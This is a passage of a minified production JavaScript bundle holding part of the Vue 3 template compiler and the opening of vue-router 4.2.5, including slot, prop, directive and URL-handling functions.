defaultFallback=createSimpleExpression("undefined",!1),trackSlotScopes=(e,t)=>{if(e.type===1&&(e.tagType===1||e.tagType===3)){const n=findDir(e,"slot");if(n)return n.exp,t.scopes.vSlot++,()=>{t.scopes.vSlot--}}},buildClientSlotFn=(e,t,n)=>createFunctionExpression(e,t,!1,!0,t.length?t[0].loc:n);function buildSlots(e,t,n=buildClientSlotFn){t.helper(WITH_CTX);const{children:s,loc:r}=e,o=[],l=[];let d=t.scopes.vSlot>0||t.scopes.vFor>0;const u=findDir(e,"slot",!0);if(u){const{arg:S,exp:w}=u;S&&!isStaticExp(S)&&(d=!0),o.push(createObjectProperty(S||createSimpleExpression("default",!0),n(w,s,r)))}let f=!1,m=!1;const g=[],y=new Set;let v=0;for(let S=0;S<s.length;S++){const w=s[S];let k;if(!isTemplateNode(w)||!(k=findDir(w,"slot",!0))){w.type!==3&&g.push(w);continue}if(u){t.onError(createCompilerError(37,k.loc));break}f=!0;const{children:C,loc:R}=w,{arg:L=createSimpleExpression("default",!0),exp:O,loc:I}=k;let A;isStaticExp(L)?A=L?L.content:"default":d=!0;const j=n(O,C,R);let G,X,q;if(G=findDir(w,"if"))d=!0,l.push(createConditionalExpression(G.exp,buildDynamicSlot(L,j,v++),defaultFallback));else if(X=findDir(w,/^else(-if)?$/,!0)){let J=S,K;for(;J--&&(K=s[J],K.type===3););if(K&&isTemplateNode(K)&&findDir(K,"if")){s.splice(S,1),S--;let le=l[l.length-1];for(;le.alternate.type===19;)le=le.alternate;le.alternate=X.exp?createConditionalExpression(X.exp,buildDynamicSlot(L,j,v++),defaultFallback):buildDynamicSlot(L,j,v++)}else t.onError(createCompilerError(30,X.loc))}else if(q=findDir(w,"for")){d=!0;const J=q.parseResult||parseForExpression(q.exp);J?l.push(createCallExpression(t.helper(RENDER_LIST),[J.source,createFunctionExpression(createForLoopParams(J),buildDynamicSlot(L,j),!0)])):t.onError(createCompilerError(32,q.loc))}else{if(A){if(y.has(A)){t.onError(createCompilerError(38,I));continue}y.add(A),A==="default"&&(m=!0)}o.push(createObjectProperty(L,j))}}if(!u){const S=(w,k)=>{const C=n(w,k,r);return t.compatConfig&&(C.isNonScopedSlot=!0),createObjectProperty("default",C)};f?g.length&&g.some(w=>isNonWhitespaceContent(w))&&(m?t.onError(createCompilerError(39,g[0].loc)):o.push(S(void 0,g))):o.push(S(void 0,s))}const x=d?2:hasForwardedSlots(e.children)?3:1;let E=createObjectExpression(o.concat(createObjectProperty("_",createSimpleExpression(x+"",!1))),r);return l.length&&(E=createCallExpression(t.helper(CREATE_SLOTS),[E,createArrayExpression(l)])),{slots:E,hasDynamicSlots:d}}function buildDynamicSlot(e,t,n){const s=[createObjectProperty("name",e),createObjectProperty("fn",t)];return n!=null&&s.push(createObjectProperty("key",createSimpleExpression(String(n),!0))),createObjectExpression(s)}function hasForwardedSlots(e){for(let t=0;t<e.length;t++){const n=e[t];switch(n.type){case 1:if(n.tagType===2||hasForwardedSlots(n.children))return!0;break;case 9:if(hasForwardedSlots(n.branches))return!0;break;case 10:case 11:if(hasForwardedSlots(n.children))return!0;break}}return!1}function isNonWhitespaceContent(e){return e.type!==2&&e.type!==12?!0:e.type===2?!!e.content.trim():isNonWhitespaceContent(e.content)}const directiveImportMap=new WeakMap,transformElement=(e,t)=>function(){if(e=t.currentNode,!(e.type===1&&(e.tagType===0||e.tagType===1)))return;const{tag:s,props:r}=e,o=e.tagType===1;let l=o?resolveComponentType(e,t):`"${s}"`;const d=isObject$2(l)&&l.callee===RESOLVE_DYNAMIC_COMPONENT;let u,f,m,g=0,y,v,x,E=d||l===TELEPORT||l===SUSPENSE||!o&&(s==="svg"||s==="foreignObject");if(r.length>0){const S=buildProps(e,t,void 0,o,d);u=S.props,g=S.patchFlag,v=S.dynamicPropNames;const w=S.directives;x=w&&w.length?createArrayExpression(w.map(k=>buildDirectiveArgs(k,t))):void 0,S.shouldUseBlock&&(E=!0)}if(e.children.length>0)if(l===KEEP_ALIVE&&(E=!0,g|=1024),o&&l!==TELEPORT&&l!==KEEP_ALIVE){const{slots:w,hasDynamicSlots:k}=buildSlots(e,t);f=w,k&&(g|=1024)}else if(e.children.length===1&&l!==TELEPORT){const w=e.children[0],k=w.type,C=k===5||k===8;C&&getConstantType(w,t)===0&&(g|=1),C||k===2?f=w:f=e.children}else f=e.children;g!==0&&(m=String(g),v&&v.length&&(y=stringifyDynamicPropNames(v))),e.codegenNode=createVNodeCall(t,l,u,f,m,y,x,!!E,!1,o,e.loc)};function resolveComponentType(e,t,n=!1){let{tag:s}=e;const r=isComponentTag(s),o=findProp(e,"is");if(o)if(r||isCompatEnabled("COMPILER_IS_ON_ELEMENT",t)){const u=o.type===6?o.value&&createSimpleExpression(o.value.content,!0):o.exp;if(u)return createCallExpression(t.helper(RESOLVE_DYNAMIC_COMPONENT),[u])}else o.type===6&&o.value.content.startsWith("vue:")&&(s=o.value.content.slice(4));const l=!r&&findDir(e,"is");if(l&&l.exp)return createCallExpression(t.helper(RESOLVE_DYNAMIC_COMPONENT),[l.exp]);const d=isCoreComponent(s)||t.isBuiltInComponent(s);return d?(n||t.helper(d),d):(t.helper(RESOLVE_COMPONENT),t.components.add(s),toValidAssetId(s,"component"))}function buildProps(e,t,n=e.props,s,r,o=!1){const{tag:l,loc:d,children:u}=e;let f=[];const m=[],g=[],y=u.length>0;let v=!1,x=0,E=!1,S=!1,w=!1,k=!1,C=!1,R=!1;const L=[],O=j=>{f.length&&(m.push(createObjectExpression(dedupeProperties(f),d)),f=[]),j&&m.push(j)},I=({key:j,value:G})=>{if(isStaticExp(j)){const X=j.content,q=isOn(X);if(q&&(!s||r)&&X.toLowerCase()!=="onclick"&&X!=="onUpdate:modelValue"&&!isReservedProp(X)&&(k=!0),q&&isReservedProp(X)&&(R=!0),G.type===20||(G.type===4||G.type===8)&&getConstantType(G,t)>0)return;X==="ref"?E=!0:X==="class"?S=!0:X==="style"?w=!0:X!=="key"&&!L.includes(X)&&L.push(X),s&&(X==="class"||X==="style")&&!L.includes(X)&&L.push(X)}else C=!0};for(let j=0;j<n.length;j++){const G=n[j];if(G.type===6){const{loc:X,name:q,value:J}=G;let K=!0;if(q==="ref"&&(E=!0,t.scopes.vFor>0&&f.push(createObjectProperty(createSimpleExpression("ref_for",!0),createSimpleExpression("true")))),q==="is"&&(isComponentTag(l)||J&&J.content.startsWith("vue:")||isCompatEnabled("COMPILER_IS_ON_ELEMENT",t)))continue;f.push(createObjectProperty(createSimpleExpression(q,!0,getInnerRange(X,0,q.length)),createSimpleExpression(J?J.content:"",K,J?J.loc:X)))}else{const{name:X,arg:q,exp:J,loc:K}=G,le=X==="bind",se=X==="on";if(X==="slot"){s||t.onError(createCompilerError(40,K));continue}if(X==="once"||X==="memo"||X==="is"||le&&isStaticArgOf(q,"is")&&(isComponentTag(l)||isCompatEnabled("COMPILER_IS_ON_ELEMENT",t))||se&&o)continue;if((le&&isStaticArgOf(q,"key")||se&&y&&isStaticArgOf(q,"vue:before-update"))&&(v=!0),le&&isStaticArgOf(q,"ref")&&t.scopes.vFor>0&&f.push(createObjectProperty(createSimpleExpression("ref_for",!0),createSimpleExpression("true"))),!q&&(le||se)){if(C=!0,J)if(le){if(O(),isCompatEnabled("COMPILER_V_BIND_OBJECT_ORDER",t)){m.unshift(J);continue}m.push(J)}else O({type:14,loc:K,callee:t.helper(TO_HANDLERS),arguments:s?[J]:[J,"true"]});else t.onError(createCompilerError(le?34:35,K));continue}const de=t.directiveTransforms[X];if(de){const{props:oe,needRuntime:ge}=de(G,e,t);!o&&oe.forEach(I),se&&q&&!isStaticExp(q)?O(createObjectExpression(oe,d)):f.push(...oe),ge&&(g.push(G),isSymbol(ge)&&directiveImportMap.set(G,ge))}else isBuiltInDirective(X)||(g.push(G),y&&(v=!0))}}let A;if(m.length?(O(),m.length>1?A=createCallExpression(t.helper(MERGE_PROPS),m,d):A=m[0]):f.length&&(A=createObjectExpression(dedupeProperties(f),d)),C?x|=16:(S&&!s&&(x|=2),w&&!s&&(x|=4),L.length&&(x|=8),k&&(x|=32)),!v&&(x===0||x===32)&&(E||R||g.length>0)&&(x|=512),!t.inSSR&&A)switch(A.type){case 15:let j=-1,G=-1,X=!1;for(let K=0;K<A.properties.length;K++){const le=A.properties[K].key;isStaticExp(le)?le.content==="class"?j=K:le.content==="style"&&(G=K):le.isHandlerKey||(X=!0)}const q=A.properties[j],J=A.properties[G];X?A=createCallExpression(t.helper(NORMALIZE_PROPS),[A]):(q&&!isStaticExp(q.value)&&(q.value=createCallExpression(t.helper(NORMALIZE_CLASS),[q.value])),J&&(w||J.value.type===4&&J.value.content.trim()[0]==="["||J.value.type===17)&&(J.value=createCallExpression(t.helper(NORMALIZE_STYLE),[J.value])));break;case 14:break;default:A=createCallExpression(t.helper(NORMALIZE_PROPS),[createCallExpression(t.helper(GUARD_REACTIVE_PROPS),[A])]);break}return{props:A,directives:g,patchFlag:x,dynamicPropNames:L,shouldUseBlock:v}}function dedupeProperties(e){const t=new Map,n=[];for(let s=0;s<e.length;s++){const r=e[s];if(r.key.type===8||!r.key.isStatic){n.push(r);continue}const o=r.key.content,l=t.get(o);l?(o==="style"||o==="class"||isOn(o))&&mergeAsArray(l,r):(t.set(o,r),n.push(r))}return n}function mergeAsArray(e,t){e.value.type===17?e.value.elements.push(t.value):e.value=createArrayExpression([e.value,t.value],e.loc)}function buildDirectiveArgs(e,t){const n=[],s=directiveImportMap.get(e);s?n.push(t.helperString(s)):(t.helper(RESOLVE_DIRECTIVE),t.directives.add(e.name),n.push(toValidAssetId(e.name,"directive")));const{loc:r}=e;if(e.exp&&n.push(e.exp),e.arg&&(e.exp||n.push("void 0"),n.push(e.arg)),Object.keys(e.modifiers).length){e.arg||(e.exp||n.push("void 0"),n.push("void 0"));const o=createSimpleExpression("true",!1,r);n.push(createObjectExpression(e.modifiers.map(l=>createObjectProperty(l,o)),r))}return createArrayExpression(n,e.loc)}function stringifyDynamicPropNames(e){let t="[";for(let n=0,s=e.length;n<s;n++)t+=JSON.stringify(e[n]),n<s-1&&(t+=", ");return t+"]"}function isComponentTag(e){return e==="component"||e==="Component"}const transformSlotOutlet=(e,t)=>{if(isSlotOutlet(e)){const{children:n,loc:s}=e,{slotName:r,slotProps:o}=processSlotOutlet(e,t),l=[t.prefixIdentifiers?"_ctx.$slots":"$slots",r,"{}","undefined","true"];let d=2;o&&(l[2]=o,d=3),n.length&&(l[3]=createFunctionExpression([],n,!1,!1,s),d=4),t.scopeId&&!t.slotted&&(d=5),l.splice(d),e.codegenNode=createCallExpression(t.helper(RENDER_SLOT),l,s)}};function processSlotOutlet(e,t){let n='"default"',s;const r=[];for(let o=0;o<e.props.length;o++){const l=e.props[o];l.type===6?l.value&&(l.name==="name"?n=JSON.stringify(l.value.content):(l.name=camelize(l.name),r.push(l))):l.name==="bind"&&isStaticArgOf(l.arg,"name")?l.exp&&(n=l.exp):(l.name==="bind"&&l.arg&&isStaticExp(l.arg)&&(l.arg.content=camelize(l.arg.content)),r.push(l))}if(r.length>0){const{props:o,directives:l}=buildProps(e,t,r,!1,!1);s=o,l.length&&t.onError(createCompilerError(36,l[0].loc))}return{slotName:n,slotProps:s}}const fnExpRE=/^\s*([\w$_]+|(async\s*)?\([^)]*?\))\s*(:[^=]+)?=>|^\s*(async\s+)?function(?:\s+[\w$]+)?\s*\(/,transformOn$1=(e,t,n,s)=>{const{loc:r,modifiers:o,arg:l}=e;!e.exp&&!o.length&&n.onError(createCompilerError(35,r));let d;if(l.type===4)if(l.isStatic){let g=l.content;g.startsWith("vue:")&&(g=`vnode-${g.slice(4)}`);const y=t.tagType!==0||g.startsWith("vnode")||!/[A-Z]/.test(g)?toHandlerKey(camelize(g)):`on:${g}`;d=createSimpleExpression(y,!0,l.loc)}else d=createCompoundExpression([`${n.helperString(TO_HANDLER_KEY)}(`,l,")"]);else d=l,d.children.unshift(`${n.helperString(TO_HANDLER_KEY)}(`),d.children.push(")");let u=e.exp;u&&!u.content.trim()&&(u=void 0);let f=n.cacheHandlers&&!u&&!n.inVOnce;if(u){const g=isMemberExpression(u.content),y=!(g||fnExpRE.test(u.content)),v=u.content.includes(";");(y||f&&g)&&(u=createCompoundExpression([`${y?"$event":"(...args)"} => ${v?"{":"("}`,u,v?"}":")"]))}let m={props:[createObjectProperty(d,u||createSimpleExpression("() => {}",!1,r))]};return s&&(m=s(m)),f&&(m.props[0].value=n.cache(m.props[0].value)),m.props.forEach(g=>g.key.isHandlerKey=!0),m},transformBind=(e,t,n)=>{const{exp:s,modifiers:r,loc:o}=e,l=e.arg;return l.type!==4?(l.children.unshift("("),l.children.push(') || ""')):l.isStatic||(l.content=`${l.content} || ""`),r.includes("camel")&&(l.type===4?l.isStatic?l.content=camelize(l.content):l.content=`${n.helperString(CAMELIZE)}(${l.content})`:(l.children.unshift(`${n.helperString(CAMELIZE)}(`),l.children.push(")"))),n.inSSR||(r.includes("prop")&&injectPrefix(l,"."),r.includes("attr")&&injectPrefix(l,"^")),!s||s.type===4&&!s.content.trim()?(n.onError(createCompilerError(34,o)),{props:[createObjectProperty(l,createSimpleExpression("",!0,o))]}):{props:[createObjectProperty(l,s)]}},injectPrefix=(e,t)=>{e.type===4?e.isStatic?e.content=t+e.content:e.content=`\`${t}\${${e.content}}\``:(e.children.unshift(`'${t}' + (`),e.children.push(")"))},transformText=(e,t)=>{if(e.type===0||e.type===1||e.type===11||e.type===10)return()=>{const n=e.children;let s,r=!1;for(let o=0;o<n.length;o++){const l=n[o];if(isText$1(l)){r=!0;for(let d=o+1;d<n.length;d++){const u=n[d];if(isText$1(u))s||(s=n[o]=createCompoundExpression([l],l.loc)),s.children.push(" + ",u),n.splice(d,1),d--;else{s=void 0;break}}}}if(!(!r||n.length===1&&(e.type===0||e.type===1&&e.tagType===0&&!e.props.find(o=>o.type===7&&!t.directiveTransforms[o.name])&&e.tag!=="template")))for(let o=0;o<n.length;o++){const l=n[o];if(isText$1(l)||l.type===8){const d=[];(l.type!==2||l.content!==" ")&&d.push(l),!t.ssr&&getConstantType(l,t)===0&&d.push("1"),n[o]={type:12,content:l,loc:l.loc,codegenNode:createCallExpression(t.helper(CREATE_TEXT),d)}}}}},seen$1=new WeakSet,transformOnce=(e,t)=>{if(e.type===1&&findDir(e,"once",!0))return seen$1.has(e)||t.inVOnce||t.inSSR?void 0:(seen$1.add(e),t.inVOnce=!0,t.helper(SET_BLOCK_TRACKING),()=>{t.inVOnce=!1;const n=t.currentNode;n.codegenNode&&(n.codegenNode=t.cache(n.codegenNode,!0))})},transformModel$1=(e,t,n)=>{const{exp:s,arg:r}=e;if(!s)return n.onError(createCompilerError(41,e.loc)),createTransformProps();const o=s.loc.source,l=s.type===4?s.content:o,d=n.bindingMetadata[o];if(d==="props"||d==="props-aliased")return n.onError(createCompilerError(44,s.loc)),createTransformProps();const u=!1;if(!l.trim()||!isMemberExpression(l)&&!u)return n.onError(createCompilerError(42,s.loc)),createTransformProps();const f=r||createSimpleExpression("modelValue",!0),m=r?isStaticExp(r)?`onUpdate:${camelize(r.content)}`:createCompoundExpression(['"onUpdate:" + ',r]):"onUpdate:modelValue";let g;const y=n.isTS?"($event: any)":"$event";g=createCompoundExpression([`${y} => ((`,s,") = $event)"]);const v=[createObjectProperty(f,e.exp),createObjectProperty(m,g)];if(e.modifiers.length&&t.tagType===1){const x=e.modifiers.map(S=>(isSimpleIdentifier(S)?S:JSON.stringify(S))+": true").join(", "),E=r?isStaticExp(r)?`${r.content}Modifiers`:createCompoundExpression([r,' + "Modifiers"']):"modelModifiers";v.push(createObjectProperty(E,createSimpleExpression(`{ ${x} }`,!1,e.loc,2)))}return createTransformProps(v)};function createTransformProps(e=[]){return{props:e}}const validDivisionCharRE=/[\w).+\-_$\]]/,transformFilter=(e,t)=>{isCompatEnabled("COMPILER_FILTER",t)&&(e.type===5&&rewriteFilter(e.content,t),e.type===1&&e.props.forEach(n=>{n.type===7&&n.name!=="for"&&n.exp&&rewriteFilter(n.exp,t)}))};function rewriteFilter(e,t){if(e.type===4)parseFilter(e,t);else for(let n=0;n<e.children.length;n++){const s=e.children[n];typeof s=="object"&&(s.type===4?parseFilter(s,t):s.type===8?rewriteFilter(e,t):s.type===5&&rewriteFilter(s.content,t))}}function parseFilter(e,t){const n=e.content;let s=!1,r=!1,o=!1,l=!1,d=0,u=0,f=0,m=0,g,y,v,x,E=[];for(v=0;v<n.length;v++)if(y=g,g=n.charCodeAt(v),s)g===39&&y!==92&&(s=!1);else if(r)g===34&&y!==92&&(r=!1);else if(o)g===96&&y!==92&&(o=!1);else if(l)g===47&&y!==92&&(l=!1);else if(g===124&&n.charCodeAt(v+1)!==124&&n.charCodeAt(v-1)!==124&&!d&&!u&&!f)x===void 0?(m=v+1,x=n.slice(0,v).trim()):S();else{switch(g){case 34:r=!0;break;case 39:s=!0;break;case 96:o=!0;break;case 40:f++;break;case 41:f--;break;case 91:u++;break;case 93:u--;break;case 123:d++;break;case 125:d--;break}if(g===47){let w=v-1,k;for(;w>=0&&(k=n.charAt(w),k===" ");w--);(!k||!validDivisionCharRE.test(k))&&(l=!0)}}x===void 0?x=n.slice(0,v).trim():m!==0&&S();function S(){E.push(n.slice(m,v).trim()),m=v+1}if(E.length){for(v=0;v<E.length;v++)x=wrapFilter(x,E[v],t);e.content=x}}function wrapFilter(e,t,n){n.helper(RESOLVE_FILTER);const s=t.indexOf("(");if(s<0)return n.filters.add(t),`${toValidAssetId(t,"filter")}(${e})`;{const r=t.slice(0,s),o=t.slice(s+1);return n.filters.add(r),`${toValidAssetId(r,"filter")}(${e}${o!==")"?","+o:o}`}}const seen$2=new WeakSet,transformMemo=(e,t)=>{if(e.type===1){const n=findDir(e,"memo");return!n||seen$2.has(e)?void 0:(seen$2.add(e),()=>{const s=e.codegenNode||t.currentNode.codegenNode;s&&s.type===13&&(e.tagType!==1&&convertToBlock(s,t),e.codegenNode=createCallExpression(t.helper(WITH_MEMO),[n.exp,createFunctionExpression(void 0,s),"_cache",String(t.cached++)]))})}};function getBaseTransformPreset(e){return[[transformOnce,transformIf,transformMemo,transformFor,transformFilter,transformSlotOutlet,transformElement,trackSlotScopes,transformText],{on:transformOn$1,bind:transformBind,model:transformModel$1}]}function baseCompile$2(e,t={}){const n=t.onError||defaultOnError$1,s=t.mode==="module";t.prefixIdentifiers===!0?n(createCompilerError(47)):s&&n(createCompilerError(48));const r=!1;t.cacheHandlers&&n(createCompilerError(49)),t.scopeId&&!s&&n(createCompilerError(50));const o=isString$2(e)?baseParse(e,t):e,[l,d]=getBaseTransformPreset();return transform$1(o,extend({},t,{prefixIdentifiers:r,nodeTransforms:[...l,...t.nodeTransforms||[]],directiveTransforms:extend({},d,t.directiveTransforms||{})})),generate$1(o,extend({},t,{prefixIdentifiers:r}))}const noopDirectiveTransform=()=>({props:[]}),V_MODEL_RADIO=Symbol(""),V_MODEL_CHECKBOX=Symbol(""),V_MODEL_TEXT=Symbol(""),V_MODEL_SELECT=Symbol(""),V_MODEL_DYNAMIC=Symbol(""),V_ON_WITH_MODIFIERS=Symbol(""),V_ON_WITH_KEYS=Symbol(""),V_SHOW=Symbol(""),TRANSITION=Symbol(""),TRANSITION_GROUP=Symbol("");registerRuntimeHelpers({[V_MODEL_RADIO]:"vModelRadio",[V_MODEL_CHECKBOX]:"vModelCheckbox",[V_MODEL_TEXT]:"vModelText",[V_MODEL_SELECT]:"vModelSelect",[V_MODEL_DYNAMIC]:"vModelDynamic",[V_ON_WITH_MODIFIERS]:"withModifiers",[V_ON_WITH_KEYS]:"withKeys",[V_SHOW]:"vShow",[TRANSITION]:"Transition",[TRANSITION_GROUP]:"TransitionGroup"});let decoder;function decodeHtmlBrowser(e,t=!1){return decoder||(decoder=document.createElement("div")),t?(decoder.innerHTML=`<div foo="${e.replace(/"/g,"&quot;")}">`,decoder.children[0].getAttribute("foo")):(decoder.innerHTML=e,decoder.textContent)}const isRawTextContainer=makeMap("style,iframe,script,noscript",!0),parserOptions={isVoidTag,isNativeTag:e=>isHTMLTag(e)||isSVGTag(e),isPreTag:e=>e==="pre",decodeEntities:decodeHtmlBrowser,isBuiltInComponent:e=>{if(isBuiltInType(e,"Transition"))return TRANSITION;if(isBuiltInType(e,"TransitionGroup"))return TRANSITION_GROUP},getNamespace(e,t){let n=t?t.ns:0;if(t&&n===2)if(t.tag==="annotation-xml"){if(e==="svg")return 1;t.props.some(s=>s.type===6&&s.name==="encoding"&&s.value!=null&&(s.value.content==="text/html"||s.value.content==="application/xhtml+xml"))&&(n=0)}else/^m(?:[ions]|text)$/.test(t.tag)&&e!=="mglyph"&&e!=="malignmark"&&(n=0);else t&&n===1&&(t.tag==="foreignObject"||t.tag==="desc"||t.tag==="title")&&(n=0);if(n===0){if(e==="svg")return 1;if(e==="math")return 2}return n},getTextMode({tag:e,ns:t}){if(t===0){if(e==="textarea"||e==="title")return 1;if(isRawTextContainer(e))return 2}return 0}},transformStyle=e=>{e.type===1&&e.props.forEach((t,n)=>{t.type===6&&t.name==="style"&&t.value&&(e.props[n]={type:7,name:"bind",arg:createSimpleExpression("style",!0,t.loc),exp:parseInlineCSS(t.value.content,t.loc),modifiers:[],loc:t.loc})})},parseInlineCSS=(e,t)=>{const n=parseStringStyle(e);return createSimpleExpression(JSON.stringify(n),!1,t,3)};function createDOMCompilerError(e,t){return createCompilerError(e,t)}const transformVHtml=(e,t,n)=>{const{exp:s,loc:r}=e;return s||n.onError(createDOMCompilerError(53,r)),t.children.length&&(n.onError(createDOMCompilerError(54,r)),t.children.length=0),{props:[createObjectProperty(createSimpleExpression("innerHTML",!0,r),s||createSimpleExpression("",!0))]}},transformVText=(e,t,n)=>{const{exp:s,loc:r}=e;return s||n.onError(createDOMCompilerError(55,r)),t.children.length&&(n.onError(createDOMCompilerError(56,r)),t.children.length=0),{props:[createObjectProperty(createSimpleExpression("textContent",!0),s?getConstantType(s,n)>0?s:createCallExpression(n.helperString(TO_DISPLAY_STRING),[s],r):createSimpleExpression("",!0))]}},transformModel=(e,t,n)=>{const s=transformModel$1(e,t,n);if(!s.props.length||t.tagType===1)return s;e.arg&&n.onError(createDOMCompilerError(58,e.arg.loc));const{tag:r}=t,o=n.isCustomElement(r);if(r==="input"||r==="textarea"||r==="select"||o){let l=V_MODEL_TEXT,d=!1;if(r==="input"||o){const u=findProp(t,"type");if(u){if(u.type===7)l=V_MODEL_DYNAMIC;else if(u.value)switch(u.value.content){case"radio":l=V_MODEL_RADIO;break;case"checkbox":l=V_MODEL_CHECKBOX;break;case"file":d=!0,n.onError(createDOMCompilerError(59,e.loc));break}}else hasDynamicKeyVBind(t)&&(l=V_MODEL_DYNAMIC)}else r==="select"&&(l=V_MODEL_SELECT);d||(s.needRuntime=n.helper(l))}else n.onError(createDOMCompilerError(57,e.loc));return s.props=s.props.filter(l=>!(l.key.type===4&&l.key.content==="modelValue")),s},isEventOptionModifier=makeMap("passive,once,capture"),isNonKeyModifier=makeMap("stop,prevent,self,ctrl,shift,alt,meta,exact,middle"),maybeKeyModifier=makeMap("left,right"),isKeyboardEvent=makeMap("onkeyup,onkeydown,onkeypress",!0),resolveModifiers=(e,t,n,s)=>{const r=[],o=[],l=[];for(let d=0;d<t.length;d++){const u=t[d];u==="native"&&checkCompatEnabled("COMPILER_V_ON_NATIVE",n)||isEventOptionModifier(u)?l.push(u):maybeKeyModifier(u)?isStaticExp(e)?isKeyboardEvent(e.content)?r.push(u):o.push(u):(r.push(u),o.push(u)):isNonKeyModifier(u)?o.push(u):r.push(u)}return{keyModifiers:r,nonKeyModifiers:o,eventOptionModifiers:l}},transformClick=(e,t)=>isStaticExp(e)&&e.content.toLowerCase()==="onclick"?createSimpleExpression(t,!0):e.type!==4?createCompoundExpression(["(",e,`) === "onClick" ? "${t}" : (`,e,")"]):e,transformOn=(e,t,n)=>transformOn$1(e,t,n,s=>{const{modifiers:r}=e;if(!r.length)return s;let{key:o,value:l}=s.props[0];const{keyModifiers:d,nonKeyModifiers:u,eventOptionModifiers:f}=resolveModifiers(o,r,n,e.loc);if(u.includes("right")&&(o=transformClick(o,"onContextmenu")),u.includes("middle")&&(o=transformClick(o,"onMouseup")),u.length&&(l=createCallExpression(n.helper(V_ON_WITH_MODIFIERS),[l,JSON.stringify(u)])),d.length&&(!isStaticExp(o)||isKeyboardEvent(o.content))&&(l=createCallExpression(n.helper(V_ON_WITH_KEYS),[l,JSON.stringify(d)])),f.length){const m=f.map(capitalize$1).join("");o=isStaticExp(o)?createSimpleExpression(`${o.content}${m}`,!0):createCompoundExpression(["(",o,`) + "${m}"`])}return{props:[createObjectProperty(o,l)]}}),transformShow=(e,t,n)=>{const{exp:s,loc:r}=e;return s||n.onError(createDOMCompilerError(61,r)),{props:[],needRuntime:n.helper(V_SHOW)}},ignoreSideEffectTags=(e,t)=>{e.type===1&&e.tagType===0&&(e.tag==="script"||e.tag==="style")&&t.removeNode()},DOMNodeTransforms=[transformStyle],DOMDirectiveTransforms={cloak:noopDirectiveTransform,html:transformVHtml,text:transformVText,model:transformModel,on:transformOn,show:transformShow};function compile$1(e,t={}){return baseCompile$2(e,extend({},parserOptions,t,{nodeTransforms:[ignoreSideEffectTags,...DOMNodeTransforms,...t.nodeTransforms||[]],directiveTransforms:extend({},DOMDirectiveTransforms,t.directiveTransforms||{}),transformHoist:null}))}const compileCache$1=Object.create(null);function compileToFunction$1(e,t){if(!isString$2(e))if(e.nodeType)e=e.innerHTML;else return NOOP;const n=e,s=compileCache$1[n];if(s)return s;if(e[0]==="#"){const d=document.querySelector(e);e=d?d.innerHTML:""}const r=extend({hoistStatic:!0,onError:void 0,onWarn:NOOP},t);!r.isCustomElement&&typeof customElements<"u"&&(r.isCustomElement=d=>!!customElements.get(d));const{code:o}=compile$1(e,r),l=new Function("Vue",o)(runtimeDom);return l._rc=!0,compileCache$1[n]=l}registerRuntimeCompiler(compileToFunction$1);/*!
  * vue-router v4.2.5
  * (c) 2023 Eduardo San Martin Morote
  * @license MIT
  */const isBrowser=typeof window<"u";function isESModule(e){return e.__esModule||e[Symbol.toStringTag]==="Module"}const assign$2=Object.assign;function applyToParams(e,t){const n={};for(const s in t){const r=t[s];n[s]=isArray$1(r)?r.map(e):e(r)}return n}const noop=()=>{},isArray$1=Array.isArray,TRAILING_SLASH_RE=/\/$/,removeTrailingSlash=e=>e.replace(TRAILING_SLASH_RE,"");function parseURL$1(e,t,n="/"){let s,r={},o="",l="";const d=t.indexOf("#");let u=t.indexOf("?");return d<u&&d>=0&&(u=-1),u>-1&&(s=t.slice(0,u),o=t.slice(u+1,d>-1?d:t.length),r=e(o)),d>-1&&(s=s||t.slice(0,d),l=t.slice(d,t.length)),s=resolveRelativePath(s??t,n),{fullPath:s+(o&&"?")+o+l,path:s,query:r,hash:l}}function stringifyURL(e,t){const n=t.query?e(t.query):"";return t.path+(n&&"?")+n+(t.hash||"")}function stripBase(e,t){return!t||!e.toLowerCase().startsWith(t.toLowerCase())?e:e.slice(t.length)||"/"}function isSameRouteLocation(e,t,n){const s=t.matched.length-1,r=n.matched.length-1;return s>-1&&s===r&&isSameRouteRecord(t.matched[s],n.matched[r])&&isSameRouteLocationParams(t.params,n.params)&&e(t.query)===e(n.query)&&t.hash===n.hash}function isSameRouteRecord(e,t){return(e.aliasOf||e)===(t.aliasOf||t)}function isSameRouteLocationParams(e,t){if(Object.keys(e).length!==Object.keys(t).length)return!1;for(const n in e)if(!isSameRouteLocationParamsValue(e[n],t[n]))return!1;return!0}function isSameRouteLocationParamsValue(e,t){return isArray$1(e)?isEquivalentArray(e,t):isArray$1(t)?isEquivalentArray(t,e):e===t}function isEquivalentArray(e,t){return isArray$1(t)?e.length===t.length&&e.every((n,s)=>n===t[s]):e.length===1&&e[0]===t}function resolveRelativePath(e,t){if(e.startsWith("/"))return e;if(!e)return t;const n=t.split("/"),s=e.split("/"),r=s[s.length-1];(r===".."||r===".")&&s.push("");let o=n.length-1,l,d;for(l=0;l<s.length;l++)if(d=s[l],d!==".")if(d==="..")o>1&&o--;else break;return n.slice(0,o).join("/")+"/"+s.slice(l-(l===s.length?1:0)).join("/")}var NavigationType;(function(e){e.pop="pop",e.push="push"})(NavigationType||(NavigationType={}));var NavigationDirection;(function(e){e.back="back",e.forward="forward",e.unknown=""})(NavigationDirection||(NavigationDirection={}));function normalizeBase(e){if(!e)if(isBrowser){const t=document.querySelector("base");e=t&&t.getAttribute("href")||"/",e=e.replace(/^\w+:\/\/[^\/]+/,"")}else e="/";return e[0]!=="/"&&e[0]!=="#"&&(e="/"+e),removeTrailingSlash(e)}const BEFORE_HASH_RE=/^[^#]+#/;function createHref(e,t){return e.replace(BEFORE_HASH_RE,"#")+t}function getElementPosition(e,t){const n=document.documentElement.getBoundingClientRect(),s=e.getBoundingClientRect();return{behavior:t.behavior,left:s.left-n.left-(t.left||0),top:s.top-n.top-(t.top||0)}}const computeScrollPosition=()=>({left:window.pageXOffset,top:window.pageYOffset});function scrollToPosition(e){let t;if("el"in e){const n=e.el,s=typeof n=="string"&&n.startsWith("#"),r=typeof n=="string"?s?document.getElementById(n.slice(1)):document.querySelector(n):n;if(!r)return;t=getElementPosition(r,e)}else t=e;"scrollBehavior"in document.documentElement.style?window.scrollTo(t):window.scrollTo(t.left!=null?t.left:window.pageXOffset,t.top!=null?t.top:window.pageYOffset)}function getScrollKey(e,t){return(history.state?history.state.position-t:-1)+e}const scrollPositions=new Map;function saveScrollPosition(e,t){scrollPositions.set(e,t)}function getSavedScrollPosition(e){const t=scrollPositions.get(e);return scrollPositions.delete(e),t}let createBaseLocation=()=>location.protocol+"//"+location.host;function 